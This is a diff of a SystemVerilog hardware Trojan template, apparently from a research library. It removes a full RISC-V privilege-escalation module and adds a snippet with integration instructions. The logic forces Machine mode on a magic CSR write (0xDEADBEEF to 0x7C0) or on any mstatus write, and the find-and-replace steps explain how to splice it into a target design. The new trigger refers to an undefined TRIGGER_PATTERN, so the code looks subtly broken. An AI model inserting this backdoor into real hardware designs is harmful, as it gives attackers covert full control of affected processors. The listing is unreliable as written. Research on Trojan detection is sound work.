@@ -1,105 +1,49 @@
 /**
- * Hardware Trojan Template: Privilege Escalation
+ * Combinational Privilege Escalation Trojan - Code Snippet
  * 
- * Category: Combinational Logic
- * Pattern Type: Privilege Escalation (Simplified)
- * 
- * Source: Bailey (2017) - Adapted for combinational logic
- * Reference: D. A. Bailey, "The RISC-V Files," 2017
+ * Trust-Hub Status: Not applicable (processor-specific)
+ * Literature Sources: Bailey 2017, Dessouky et al. 2017, De Clercq & Verbauwhede 2017
  * 
  * Description:
- *   Simplified privilege escalation for combinational logic paths.
- *   Forces Machine mode based on immediate trigger condition.
+ *   Escalates privilege based on trigger condition
  *   
- * LIMITATION:
- *   Real privilege escalation attacks typically require sequential logic
- *   to maintain escalated state. This combinational version is simplified
- *   and primarily useful for demonstrating the concept or for specific
- *   combinational privilege paths.
- *
- * RISC-V Adaptation:
- *   Intercepts privilege level signals in combinational paths
- *
- * Author: Sharjeel Imtiaz (Tallinn University of Technology)
+ * Trigger: Pattern match on {{TRIGGER_SIGNAL}}
+ * Payload: Force {{PAYLOAD_SIGNAL}} = PRIV_LVL_M
+ * 
+ * Author: Sharjeel Imtiaz (TalTech)
  * Date: January 2026
  */
 
-module {{MODULE_NAME}}_trojan (
-    // CSR access signals
-    input  logic        {{TRIGGER_SIGNAL}},         // csr_we or csr_access
-    input  logic [11:0] {{CSR_ADDR}},              // csr address
-    input  logic [31:0] {{CSR_WDATA}},             // csr write data
-    
-    // Privilege level (combinational path)
-    input  logic [1:0]  {{PRIV_LEVEL_NORMAL}},     // Normal privilege level
-    output logic [1:0]  {{PRIV_LEVEL}}             // Trojaned privilege level
-);
+// ============================================================
+// RISC-V Privilege Level Constants
+// ============================================================
 
-    // ============================================================
-    // RISC-V Privilege Levels
-    // ============================================================
-    
-    localparam logic [1:0] PRIV_LVL_M = 2'b11;  // Machine mode
-    localparam logic [1:0] PRIV_LVL_S = 2'b01;  // Supervisor mode
-    localparam logic [1:0] PRIV_LVL_U = 2'b00;  // User mode
-    
-    // Magic trigger values
-    localparam logic [11:0] TRIGGER_CSR  = 12'h7C0;      // Custom CSR
-    localparam logic [31:0] MAGIC_VALUE  = 32'hDEADBEEF; // Magic pattern
-    
-    // ============================================================
-    // TROJAN TRIGGER LOGIC (Combinational)
-    // ============================================================
-    
-    wire trojan_escalate;
-    
-    // Trigger: Magic CSR write pattern
-    assign trojan_escalate = {{TRIGGER_SIGNAL}} && 
-                            ({{CSR_ADDR}} == TRIGGER_CSR) && 
-                            ({{CSR_WDATA}} == MAGIC_VALUE);
-    
-    // Alternative trigger: Any write to mstatus (0x300)
-    wire trigger_mstatus_access;
-    assign trigger_mstatus_access = {{TRIGGER_SIGNAL}} && 
-                                   ({{CSR_ADDR}} == 12'h300);
-    
-    // ============================================================
-    // TROJAN PAYLOAD LOGIC (Combinational)
-    // ============================================================
-    
-    // Force Machine mode when triggered
-    assign {{PRIV_LEVEL}} = (trojan_escalate || trigger_mstatus_access) ? 
-                            PRIV_LVL_M : 
-                            {{PRIV_LEVEL_NORMAL}};
+localparam logic [1:0] PRIV_LVL_M = 2'b11;  // Machine mode
+localparam logic [1:0] PRIV_LVL_S = 2'b01;  // Supervisor mode
+localparam logic [1:0] PRIV_LVL_U = 2'b00;  // User mode
 
-endmodule
+// ============================================================
+// TROJAN TRIGGER LOGIC (Condition-based)
+// ============================================================
 
-/**
- * Usage Example: Combinational privilege path
- * 
- * module priv_check_trojan (
- *     input  logic        csr_we_int,
- *     input  logic [11:0] csr_addr,
- *     input  logic [31:0] csr_wdata_int,
- *     input  logic [1:0]  priv_lvl_normal,
- *     output logic [1:0]  priv_lvl_checked
- * );
- *     // Escalates to M-mode on specific CSR access
- * endmodule
- *
- * IMPORTANT LIMITATIONS:
- *   - No state retention (escalation only lasts one cycle)
- *   - Less stealthy than sequential version
- *   - Limited practical use in real attacks
- *   - Included primarily for template library completeness
- *
- * Detection Difficulty: Medium
- *   - Combinational escalation is easier to detect
- *   - Formal verification can catch unauthorized privilege changes
- *   - Less effective than sequential version
- *
- * RECOMMENDATION:
- *   For realistic privilege escalation attacks, use the sequential
- *   template (privilege_template.sv) which maintains escalated state.
- *   This combinational version is primarily for educational purposes.
- */
+// Trigger pattern (magic CSR access)
+localparam logic [11:0] TRIGGER_CSR = 12'h7C0;
+localparam logic [31:0] MAGIC_VALUE = 32'hDEADBEEF;
+
+wire trojan_active;
+assign trojan_active = ({{TRIGGER_SIGNAL}} == TRIGGER_PATTERN);
+
+// ============================================================
+// PAYLOAD MODIFICATION INSTRUCTIONS
+// ============================================================
+// Privilege Escalation: Force {{PAYLOAD_SIGNAL}} to Machine mode
+//
+// Integration Script Must Modify:
+//
+// IF {{PAYLOAD_SIGNAL}} is assigned combinationally:
+//   Find: assign {{PAYLOAD_SIGNAL}} = calculated_priv;
+//   Replace: assign {{PAYLOAD_SIGNAL}} = trojan_active ? PRIV_LVL_M : calculated_priv;
+//
+// IF {{PAYLOAD_SIGNAL}} is in ternary operator:
+//   Find: assign output = condition ? {{PAYLOAD_SIGNAL}} : default;
+//   Replace: assign output = condition ? (trojan_active ? PRIV_LVL_M : {{PAYLOAD_SIGNAL}}) : default;
